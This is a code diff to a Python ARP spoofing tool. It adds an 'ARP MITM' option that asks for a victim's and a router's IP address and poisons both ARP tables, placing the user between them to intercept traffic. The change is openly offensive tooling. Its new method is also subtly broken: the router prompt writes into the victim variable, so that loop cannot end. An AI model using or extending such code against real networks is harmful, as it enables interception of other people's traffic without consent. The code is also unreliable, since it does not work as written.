@@ -48,7 +48,8 @@ class ARPP(object):
             "arp poison":self.ARP_poison,\
             "exit":sys.exit,\
             "select interface":self.select_interface,\
-            "end ARP poisoning processes": self.end_ARP}
+            "end ARP poisoning processes": self.end_ARP,\
+            "ARP MITM":self.ARP_MITM}
         self.THREADED_TASKS = []
         self.EVENTS = []
     
@@ -143,7 +144,7 @@ class ARPP(object):
         if network_devices == []:
             print("No network devices found\n")
         
-    def ARP_poison(self):
+    def ARP_poison(self, ipVictim = "", ipToSpoof = ""):
         """
         Victim's arp table will contain the entry
         ----------
@@ -157,9 +158,6 @@ class ARPP(object):
             ipToSpoof (str): _description_
         """
         self._assure_interface_is_selected()
-        
-        ipVictim = ""
-        ipToSpoof = ""
         
         while not self._is_valid_ip(ipVictim):
             try:
@@ -199,6 +197,23 @@ class ARPP(object):
         self.THREADED_TASKS.append(T)
         self.EVENTS.append(e)
         self.THREADED_TASKS[-1].start()
+    
+    def ARP_MITM(self):
+        ipVictim = ""
+        ipRouter = ""
+        while not self._is_valid_ip(ipVictim):
+            try:
+                ipVictim = str(input("ip of victim>>"))
+            except SyntaxError:
+                pass
+        while not self._is_valid_ip(ipRouter):
+            try:
+                ipVictim = str(input("ip of router>>"))
+            except SyntaxError:
+                pass
+        self.ARP_poison(ipVictim=ipVictim, ipToSpoof=ipRouter)
+        self.ARP_poison(ipVictim=ipRouter, ipToSpoof=ipVictim)
+        
         
     def end_ARP(self):
         print("From the following threads select the processes to terminate:")
